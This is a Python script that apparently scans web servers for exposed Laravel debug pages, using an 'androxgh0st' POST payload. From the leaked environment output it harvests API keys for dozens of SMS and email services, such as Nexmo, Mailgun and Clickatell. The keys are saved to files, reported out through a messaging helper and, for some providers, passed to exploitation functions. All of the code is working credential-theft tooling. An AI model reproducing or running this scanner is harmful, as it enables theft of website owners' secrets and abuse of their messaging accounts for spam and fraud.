
from send_msg import send_msg2
from mailer import ExploitS
from nexmo import nexmox
import requests, os, sys, codecs
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from time import time as timer
import time
from random import sample as rand
from platform import system
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
from re import findall as reg
init (autoreset=True)

requests.packages.urllib3.disable_warnings (InsecureRequestWarning)


def debug(url):
    try:
        headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.post('https://'+url, data={"0x[]":"androxgh0st"}, headers=headers, verify=False, allow_redirects=False)
       
        print('Testing ..  [ ' +url+' ] === [ DEBUG ]')
        all1=get_source.content  
        if "APP_KEY" in all1:
            open ('./used/url.txt', 'a').write (url+ '\n')
            if "xkeysib" in all1:
                send_msg2(url+'found xkeysib')
                open ('./work/xkeysibdebug.txt', 'a').write (get_source.content+ '\n')
            if "SMS" in all1:
                send_msg2(url+'found SMS')
                open ('./work/sms.txt', 'a').write (all1+ '\n')
            if "CLICKATELL" in all1:
                send_msg2(url+'found CLICKATELL')
                open ('./work/CLICKATELL.txt', 'a').write (get_source.content+ '\n')
            if "smsfactor" in all1:
                send_msg2(url+'found smsfactor')
                open ('./work/smsfactor.txt', 'a').write (get_source.content+ '\n')    
            if "MSG91" in all1:
                send_msg2(url+'found MSG91')
                open ('./work/MSG91.txt', 'a').write (get_source.content+ '\n')
            if "PLIVO" in all1:
                send_msg2(url+'found PLIVO')
                open ('./work/PLIVO.txt', 'a').write (get_source.content+ '\n')
            if "NETELIP" in all1:
                send_msg2(url+'found NETELIP')
                open ('./work/NETELIP.txt', 'a').write (get_source.content+ '\n')
            if "NEXMO" in all1:
                nexmox(all1,url)
                send_msg2(url+'found nexmo')
                open ('./work/NEXMO.txt', 'a').write (get_source.content+ '\n')
            if "VONAGE" in all1:
                nexmox(all1,url)
                send_msg2(url+'found VONAGE')
                open ('./work/VONAGE.txt', 'a').write (get_source.content+ '\n')
            if "africastalking" in all1:
                send_msg2(url+'africastalking')
                open ('./work/africastalking.txt', 'a').write (get_source.content+ '\n')
            if "skebby" in all1:
                send_msg2(url+'skebby')
                open ('./work/skebby.txt', 'a').write (get_source.content+ '\n')
            if "hablame" in all1:
                send_msg2(url+'hablame')
                open ('./work/hablame.txt', 'a').write (get_source.content+ '\n')
            if "lifetimesms" in all1:
                send_msg2(url+'lifetimesms')
                open ('./work/lifetimesms.txt', 'a').write (get_source.content+ '\n')
            if "semaphore" in all1:
                send_msg2(url+'semaphore')
                open ('./work/semaphore.txt', 'a').write (get_source.content+ '\n')
            if "mailjet" in all1:
                send_msg2(url+'mailjet')
                open ('./work/mailjet.txt', 'a').write (get_source.content+ '\n')
            if "telesign" in all1:
                send_msg2(url+'telesign')
                open ('./work/telesign.txt', 'a').write (get_source.content+ '\n')
            if "onnorokomsms" in all1:
                send_msg2(url+'onnorokomsms')
                open ('./work/onnorokomsms.txt', 'a').write (get_source.content+ '\n')
            if "etracker" in all1:
                send_msg2(url+'etracker')
                open ('./work/etracker.txt', 'a').write (get_source.content+ '\n')
            if "budgetsms" in all1:
                send_msg2(url+'budgetsms')
                open ('./work/budgetsms.txt', 'a').write (get_source.content+ '\n')
            if "zenvia" in all1:
                send_msg2(url+'zenvia')
                open ('./work/zenvia.txt', 'a').write (get_source.content+ '\n')
            if "smsaero" in all1:
                send_msg2(url+'smsaero')
                open ('./work/smsaero.txt', 'a').write (get_source.content+ '\n')
            if "smsportal" in all1:
                send_msg2(url+'smsportal')
                open ('./work/smsportal.txt', 'a').write (get_source.content+ '\n')
            if "boomsms" in all1:
                send_msg2(url+'boomsms')
                open ('./work/boomsms.txt', 'a').write (get_source.content+ '\n')
            if "smsmasivos" in all1:
                send_msg2(url+'smsmasivos')
                open ('./work/smsmasivos.txt', 'a').write (get_source.content+ '\n')
            if "wausms" in all1:
                send_msg2(url+'wausms')
                open ('./work/wausms.txt', 'a').write (get_source.content+ '\n')
            if "advantasms" in all1:
                send_msg2(url+'advantasms')
                open ('./work/advantasms.txt', 'a').write (get_source.content+ '\n')
            if "clicksend" in all1:
                send_msg2(url+'clicksend')
                open ('./work/clicksend.txt', 'a').write (get_source.content+ '\n')
            if "sms.to" in all1:
                send_msg2(url+'sms.to')
                open ('./work/smsto.txt', 'a').write (get_source.content+ '\n')
            if "moceanapi" in all1:
                send_msg2(url+'moceanapi')
                open ('./work/moceanapi.txt', 'a').write (get_source.content+ '\n')
            if "smsviro" in all1:
                send_msg2(url+'smsviro')
                open ('./work/smsviro.txt', 'a').write (get_source.content+ '\n')
            if "textlocal" in all1:
                send_msg2(url+'textlocal')
                open ('./work/textlocal.txt', 'a').write (get_source.content+ '\n')          
            if "sinch" in all1:
                send_msg2(url+'sinch')
                open ('./work/sinch.txt', 'a').write (get_source.content+ '\n')
            if "infobip" in all1:
                send_msg2(url+'infobip')
                open ('./work/infobip.txt', 'a').write (get_source.content+ '\n')
            if "mailgun" in all1:
                send_msg2(url+'mailgun')
                ExploitS(all1,url)
                open ('./work/mailgun.txt', 'a').write (get_source.content+ '\n')  
    except:
        pass
